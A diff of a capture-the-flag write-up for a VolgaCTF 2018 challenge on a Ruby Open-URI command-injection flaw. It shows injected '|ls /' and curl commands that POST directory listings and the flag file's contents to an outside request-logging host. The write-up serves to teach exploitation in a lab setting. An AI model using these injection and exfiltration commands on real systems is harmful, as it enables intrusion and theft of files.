@@ -10,7 +10,8 @@ Site working on Sinatra Framework (Ruby)
 
 4. Do you hear something about Ruby Open-Uri vulnerability?
 
-[Read this](http://old-government-site.quals.2018.volgactf.ru:8080/page?id=18)
+[Read this](https://habrahabr.ru/post/251823/)
+
 
 5. Try to type *|ls /*
 6. It`s works!
@@ -21,7 +22,7 @@ For example, [pustreq](https://putsreq.com/)
 8. It`s looks intresting... 
 
 ```bash
-curl -d "$(ls -l /)" -X POST https://putsreq.com/your-application/
+|curl -d "$(ls -l /)" -X POST https://putsreq.com/your-application/
 ```
 
 We have a file called **flag**
@@ -29,7 +30,7 @@ We have a file called **flag**
 9. Finally...
 
 ```bash
-curl -d "$(cat flag)" -X POST https://putsreq.com/your-application/
+|curl -d "$(cat flag)" -X POST https://putsreq.com/your-application/
 ```
 
 10. Congratulations!
